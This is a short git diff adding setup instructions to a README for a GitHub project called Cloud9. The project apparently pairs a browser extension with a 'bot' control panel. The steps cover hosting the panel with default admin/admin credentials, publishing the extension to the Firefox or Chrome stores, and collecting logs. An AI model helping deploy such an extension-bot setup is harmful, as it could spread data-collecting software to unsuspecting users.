@@ -17,3 +17,33 @@ https://github.com/Antonio24/Cloud9
  this project has a probleme, i have fixed some probleme 
 
 
+# what do you need ?
+
+1) hosting (free or not)
+ 
+2) Upload your extension one mozilla firefox or chrome web store (if you have a problem contact me )
+
+# how to test ?
+
+1) send the folder "bot" to your web server 
+
+login : admin
+
+password : admin 
+
+2) open mozilla firefox
+
+ tape in your browser : 
+about:debugging
+
+load file :" manifest.json"
+
+3) get logs in logs/logs.txt 
+
+
+
+
+
+
+
+
